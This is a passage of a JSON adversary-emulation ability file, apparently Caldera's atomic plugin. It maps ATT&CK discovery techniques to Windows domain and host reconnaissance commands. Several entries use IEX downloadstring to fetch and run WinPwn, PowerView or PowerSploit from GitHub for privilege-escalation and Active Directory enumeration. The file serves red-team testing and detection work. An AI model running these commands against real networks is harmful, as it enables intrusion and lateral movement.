                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "775710727daed64ab5c67e0ac394ae87",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "5542e43c5f972ee1492edab2283dd1f6": {
        "description": "Launches the DirLister executable for a short period of time and then exits.\n\nRecently seen used by [BlackCat ransomware](https://news.sophos.com/en-us/2022/07/14/blackcat-ransomware-attacks-not-merely-a-byproduct-of-bad-luck/) to create a list of accessible directories and files.",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1083",
            "name": "File and Directory Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "Start-Process PathToAtomicsFolder\\T1083\\bin\\DirLister.exe; Start-Sleep -Second 4; Stop-Process -Name \"DirLister\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "5542e43c5f972ee1492edab2283dd1f6",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "f8de05d1741dcc468f772ab0ff4dac72": {
        "description": "Utilize tasklist to identify processes.\n\nUpon successful execution, cmd.exe will execute tasklist.exe to list processes. Output will be via stdout. \n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1057",
            "name": "Process Discovery"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "tasklist",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "f8de05d1741dcc468f772ab0ff4dac72",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "03c8721619373b6c18a55721a33cad2c": {
        "description": "Find machines where user has local admin access (PowerView). Upon execution, progress and info about each host in the domain being scanned will be displayed.\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1069.002",
            "name": "Permission Groups Discovery: Domain Groups"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-LocalAdminAccess -Verbose",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "03c8721619373b6c18a55721a33cad2c",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "ed229139c766eb00e6f1aece3806a481": {
        "description": "This test is a Powershell script that enumerates Active Directory to determine computers that are joined to the domain. \nThis test is designed to mimic how SessionGopher can determine the additional systems within a domain, which has been used before by threat actors to aid in lateral movement. \nReference: [Head Fake: Tackling Disruptive Ransomware Attacks](https://www.mandiant.com/resources/head-fake-tackling-disruptive-ransomware-attacks). \nUpon successful execution, this test will output the names of the computers that reside on the domain to the console window. \n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1018",
            "name": "Remote System Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher(\"(ObjectCategory=Computer)\"); $DirectorySearcher.PropertiesToLoad.Add(\"Name\"); $Computers = $DirectorySearcher.findall(); foreach ($Computer in $Computers) {;   $Computer = $Computer.Properties.name;   if (!$Computer) { Continue };   Write-Host $Computer}",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "ed229139c766eb00e6f1aece3806a481",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "f5dd56d901db9f95668988426326bc3a": {
        "description": "When successful, accounts that do not require kerberos pre-auth will be returned\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1069.002",
            "name": "Permission Groups Discovery: Domain Groups"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "get-aduser -f * -pr DoesNotRequirePreAuth | where {$_.DoesNotRequirePreAuth -eq $TRUE}",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "f5dd56d901db9f95668988426326bc3a",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "8be175eb24a31c5765554a8d8f70fc9a": {
        "description": "The following Atomic test will utilize get-wmiobject to enumerate Active Directory for Domain Controllers.\nUpon successful execution a listing of Systems from AD will output with their paths.\nReference: https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-wmiobject?view=powershell-5.1\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1018",
            "name": "Remote System Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "get-wmiobject -class ds_computer -namespace root\\directory\\ldap",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "8be175eb24a31c5765554a8d8f70fc9a",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "4f978da47c3dfb3fbf98ecc3cc99c92b": {
        "description": "Identify System language by querying the registry on an endpoint. \n\nUpon successful execution, result in number format can be looked up to correlate the language.\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1614.001",
            "name": "System Location Discovery: System Language Discovery"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "reg query HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Nls\\Language",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "4f978da47c3dfb3fbf98ecc3cc99c92b",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "ee12056a74be07c381877d47531429b6": {
        "description": "Searches for Google Chromes's and Edge Chromium's Bookmarks file (on Windows distributions) that contains bookmarks.\nUpon execution, paths that contain bookmark files will be displayed.\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1217",
            "name": "Browser Bookmark Discovery"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "where /R C:\\Users\\ Bookmarks",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "ee12056a74be07c381877d47531429b6",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "f25fb8543b8e49af2aba023985234d1e": {
        "description": "Uses the dsquery command to discover domain trusts.\nRequires the installation of dsquery via Windows RSAT or the Windows Server AD DS role.\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1482",
            "name": "Domain Trust Discovery"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "dsquery * -filter \"(objectClass=trustedDomain)\" -attr *",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "f25fb8543b8e49af2aba023985234d1e",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "d57373ae8a4e7b88083df96fb759bd1f": {
        "description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Exchange Objects\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1087.002",
            "name": "Account Discovery: Domain Account"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "12011c_AdFind.exe -sc exchaddresses",
                    "payloads": [
                        "12011c_AdFind.exe"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "d57373ae8a4e7b88083df96fb759bd1f",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "8f85d74c3e78c652a9162dcf1296b404": {
        "description": "Enumerate logged on users. Upon execution, logged on users will be displayed.\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1087.001",
            "name": "Account Discovery: Local Account"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "query user",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "8f85d74c3e78c652a9162dcf1296b404",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "bc34d6834bdf568e206627f7809a556f": {
        "description": "Start MS-RPRN RPC Service Scan using spoolvulnscan function of WinPwn",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1046",
            "name": "Network Service Scanning"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); spoolvulnscan -noninteractive -consoleoutput",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "bc34d6834bdf568e206627f7809a556f",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "2bf75f949823305d3ea815c8e94e9ee3": {
        "description": "Use the PowerShell environment variables to identify the current logged user.",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1033",
            "name": "System Owner/User Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item -Path .\\CurrentactiveUser.txt -Force",
                    "command": "[System.Environment]::UserName | Out-File -FilePath .\\CurrentactiveUser.txt ; $env:UserName | Out-File -FilePath .\\CurrentactiveUser.txt -Append",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "2bf75f949823305d3ea815c8e94e9ee3",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "6e5ddcde678698ef20f1a9d90d81cf23": {
        "description": "This module runs the Windows executable of SharpHound in order to remotely list members of the local Administrators group (SAMR)\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1069.001",
            "name": "Permission Groups Discovery: Local Groups"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item -Recurse $env:TEMP\\SharpHound\\ -ErrorAction Ignore",
                    "command": "New-Item -Path \"$env:TEMP\\SharpHound\\\" -ItemType Directory > $null; & \"$env:TEMP\\SharpHound.exe\" -d \"$env:UserDnsDomain\" --CollectionMethod LocalAdmin --NoSaveCache --OutputDirectory \"$env:TEMP\\SharpHound\\\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "6e5ddcde678698ef20f1a9d90d81cf23",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "7b9c7afaefa59aab759b49af0d699ac1": {
        "description": "Perform peripheral device discovery using Get-WMIObject Win32_PnPEntity",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1120",
            "name": "Peripheral Device Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item $env:TEMP\\T1120_collection.txt -ErrorAction Ignore",
                    "command": "Get-WMIObject Win32_PnPEntity | Format-Table Name, Description, Manufacturer > $env:TEMP\\T1120_collection.txt; $Space,$Heading,$Break,$Data = Get-Content $env:TEMP\\T1120_collection.txt; @($Heading; $Break; $Data |Sort-Object -Unique) | ? {$_.trim() -ne \"\" } |Set-Content $env:TEMP\\T1120_collection.txt",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "7b9c7afaefa59aab759b49af0d699ac1",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "a1f48fa3ddee658b29b414523c9a295b": {
        "description": "Basic Permission Groups Discovery for Windows. This test will display some errors if run on a computer not connected to a domain. Upon execution, domain\ninformation will be displayed.\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1069.001",
            "name": "Permission Groups Discovery: Local Groups"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "net localgroup && net localgroup \"Administrators\"",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "a1f48fa3ddee658b29b414523c9a295b",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "566b2f5743d88edb44ad1d9d450e921c": {
        "description": "Search for Resource-Based Constrained Delegation attack paths using RBCD-Check function of WinPwn",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1082",
            "name": "System Information Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); RBCD-Check -consoleoutput -noninteractive",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "566b2f5743d88edb44ad1d9d450e921c",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "6103e503cb444bc7b4187704f2035708": {
        "description": "Basic Permission Groups Discovery for Windows. This test will display some errors if run on a computer not connected to a domain. Upon execution, domain\ninformation will be displayed.\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1069.002",
            "name": "Permission Groups Discovery: Domain Groups"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "net localgroup && net group /domain && net group \"domain admins\" /domain && net group \"enterprise admins\" /domain",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "6103e503cb444bc7b4187704f2035708",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "562d85a09d73f7471bd3232cbd8777cb": {
        "description": "Identify System owner or users on an endpoint.\n\nUpon successful execution, cmd.exe will spawn multiple commands against a target host to identify usernames. Output will be via stdout. \nAdditionally, two files will be written to disk - computers.txt and usernames.txt.\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1033",
            "name": "System Owner/User Discovery"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "cmd.exe /C whoami && wmic useraccount get /ALL && quser /SERVER:\"#{computer_name}\" && quser && qwinsta.exe /server:#{computer_name} && qwinsta.exe && for /F \"tokens=1,2\" %i in ('qwinsta /server:#{computer_name} ^| findstr \"Active Disc\"') do @echo %i | find /v \"#\" | find /v \"console\" || echo %j > computers.txt && @FOR /F %n in (computers.txt) DO @FOR /F \"tokens=1,2\" %i in ('qwinsta /server:%n ^| findstr \"Active Disc\"') do @echo %i | find /v \"#\" | find /v \"console\" || echo %j > usernames.txt",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "562d85a09d73f7471bd3232cbd8777cb",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "084fbb4334647055312ae57e7436cd66": {
        "description": "Find or discover files on the file system.  Upon successful execution, this test will output the results of all the data discovery commands to a specified file.\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1083",
            "name": "File and Directory Discovery"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "del %temp%\\T1083Test1.txt",
                    "command": "dir /s c:\\ >> %temp%\\T1083Test1.txt && dir /s \"c:\\Documents and Settings\" >> %temp%\\T1083Test1.txt && dir /s \"c:\\Program Files\\\" >> %temp%\\T1083Test1.txt && dir \"%systemdrive%\\Users\\*.*\" >> %temp%\\T1083Test1.txt && dir \"%userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\*.*\" >> %temp%\\T1083Test1.txt && dir \"%userprofile%\\Desktop\\*.*\" >> %temp%\\T1083Test1.txt && tree /F >> %temp%\\T1083Test1.txt",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "084fbb4334647055312ae57e7436cd66",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "009e7a7118b5a182b2a5b65150e5cc6f": {
        "description": "Powersploits privesc checks using oldchecks function of WinPwn",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1082",
            "name": "System Information Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "rm -force -recurse .\\DomainRecon -ErrorAction Ignore; rm -force -recurse .\\Exploitation -ErrorAction Ignore; rm -force -recurse .\\LocalPrivEsc -ErrorAction Ignore; rm -force -recurse .\\LocalRecon -ErrorAction Ignore; rm -force -recurse .\\Vulnerabilities -ErrorAction Ignore",
                    "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); oldchecks -noninteractive -consoleoutput",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "009e7a7118b5a182b2a5b65150e5cc6f",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "b8453a5fe06b24aea12b27592d5c3d3a": {
        "description": "Methods to identify Security Software on an endpoint\n\nwhen sucessfully executed, powershell is going to processes related AV products if they are running.\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1518.001",
            "name": "Software Discovery: Security Software Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "get-process | ?{$_.Description -like \"*virus*\"}; get-process | ?{$_.Description -like \"*carbonblack*\"}; get-process | ?{$_.Description -like \"*defender*\"}; get-process | ?{$_.Description -like \"*cylance*\"}",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "b8453a5fe06b24aea12b27592d5c3d3a",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "6bcae75374f0e5b9008dc1c830f6dda1": {
        "description": "Identify the system time. Upon execution, the local computer system time and timezone will be displayed.\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1124",
            "name": "System Time Discovery"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "net time \\\\localhost && w32tm /tz",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "6bcae75374f0e5b9008dc1c830f6dda1",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "99b0dd4daabb5d59520204d34f3ff668": {
        "description": "Network Share Discovery utilizing the command prompt. The computer name variable may need to be modified to point to a different host\nUpon execution avalaible network shares will be displayed in the powershell session\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1135",
            "name": "Network Share Discovery"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "net view \\\\localhost",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "99b0dd4daabb5d59520204d34f3ff668",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "60b4ba256941c473d1fb335230c4af07": {
        "description": "PowerView is a PowerShell tool to gain network situational awareness on Windows domains. ShareFinder finds (non-standard) shares on machines in the domain.",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1135",
            "name": "Network Share Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "if (Test-Path $env:TEMP\\PowerView.ps1) { ; } else {Invoke-WebRequest \"https://raw.githubusercontent.com/darkoperator/Veil-PowerView/8784e33f17ee7543ba2f45e27dc5f08ea3a1b856/PowerView/powerview.ps1\" -OutFile $env:TEMP\\PowerView.ps1};  ;  Import-Module $env:TEMP\\PowerView.ps1; Invoke-ShareFinder -CheckShareAccess",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "60b4ba256941c473d1fb335230c4af07",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "25b475e94dd2d70fcc66b2ce43c8f718": {
        "description": "Network Share Discovery utilizing PowerShell. The computer name variable may need to be modified to point to a different host\nUpon execution, avalaible network shares will be displayed in the powershell session\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1135",
            "name": "Network Share Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "get-smbshare",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "25b475e94dd2d70fcc66b2ce43c8f718",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "42102f01777d40a7db982282c4c791e9": {
        "description": "When successful, accounts that do not require kerberos pre-auth will be returned.\nReference: https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1069.002",
            "name": "Permission Groups Discovery: Domain Groups"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "Get-ADUser -Filter 'useraccountcontrol -band 4194304' -Properties useraccountcontrol | Format-Table name",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "42102f01777d40a7db982282c4c791e9",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "57781057e51ffecf21e38fd31c9d2f79": {
        "description": "Utilizing PowerView, run Get-DomainGroup to identify the domain groups. Upon execution, Groups within the domain will be listed.\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1069.002",
            "name": "Permission Groups Discovery: Domain Groups"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainGroup -verbose",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "57781057e51ffecf21e38fd31c9d2f79",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "9b5a0a6644a9cccc3dc3aa8be490430e": {
        "description": "Identify network configuration information as seen by Trickbot and described here https://www.sneakymonkey.net/2019/10/29/trickbot-analysis-part-ii/\n\nUpon successful execution, cmd.exe will spawn `ipconfig /all`, `net config workstation`, `net view /all /domain`, `nltest /domain_trusts`. Output will be via stdout.\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1016",
            "name": "System Network Configuration Discovery"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "ipconfig /all && net config workstation && net view /all /domain && nltest /domain_trusts",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "9b5a0a6644a9cccc3dc3aa8be490430e",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "4bf4facd1dad540d4b17ebe0db235707": {
        "description": "Gathers general domain information using the generaldomaininfo function of WinPwn",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1087.002",
            "name": "Account Discovery: Domain Account"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); generaldomaininfo -noninteractive -consoleoutput",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "4bf4facd1dad540d4b17ebe0db235707",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "8ddfaf982ab359cda13626b870ccb339": {
        "description": "Query the registry to determine the version of internet explorer installed on the system.\nUpon execution, version information about internet explorer will be displayed.\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1518",
            "name": "Software Discovery"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "reg query \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Internet Explorer\" /v svcVersion",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "8ddfaf982ab359cda13626b870ccb339",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "b7e7e9eb804006a78cdd75940f7b7c3e": {
        "description": "Collect general computer informations via GeneralRecon function of WinPwn",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1082",
            "name": "System Information Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); Generalrecon -consoleoutput -noninteractive",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "b7e7e9eb804006a78cdd75940f7b7c3e",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "5a33c31395b6ef3ee38097b327c8b79d": {
        "description": "The following Atomic test will utilize ADSISearcher to enumerate users within Active Directory.\nUpon successful execution a listing of users will output with their paths in AD.\nReference: https://devblogs.microsoft.com/scripting/use-the-powershell-adsisearcher-type-accelerator-to-search-active-directory/\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1087.002",
            "name": "Account Discovery: Domain Account"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "([adsisearcher]\"objectcategory=user\").FindAll(); ([adsisearcher]\"objectcategory=user\").FindOne()",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "5a33c31395b6ef3ee38097b327c8b79d",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "02878c3142e4a5a97c82c3c62d864d71": {
        "description": "Use powershell to enumerate AD information.\nRequires the installation of PowerShell AD admin cmdlets via Windows RSAT or the Windows Server AD DS role.\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1482",
            "name": "Domain Trust Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "Import-Module \"$env:TEMP\\PowerView.ps1\"; Get-NetDomainTrust; Get-NetForestTrust; Get-ADDomain; Get-ADGroupMember Administrators -Recursive",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "02878c3142e4a5a97c82c3c62d864d71",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "628181210e822588b5d90e1e256d775a": {
        "description": "Discover Local Privilege Escalation possibilities using itm4nprivesc function of WinPwn",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1082",
            "name": "System Information Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); itm4nprivesc -noninteractive -consoleoutput",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "628181210e822588b5d90e1e256d775a",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "efc8346315601012db4a1f9afd7436a4": {
        "description": "Uses the built-in Windows utility gpresult to display the Resultant Set of Policy (RSoP) information for a remote user and computer\nThe /z parameter displays all available information about Group Policy. More parameters can be found in the linked Microsoft documentation\nhttps://docs.microsoft.com/en-us/windows-server/administration/windows-commands/gpresult\nhttps://unit42.paloaltonetworks.com/emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve/\nTurla has used the /z and /v parameters: https://www.welivesecurity.com/wp-content/uploads/2020/05/ESET_Turla_ComRAT.pdf\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1615",
            "name": "Group Policy Discovery"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "gpresult /z",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "efc8346315601012db4a1f9afd7436a4",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
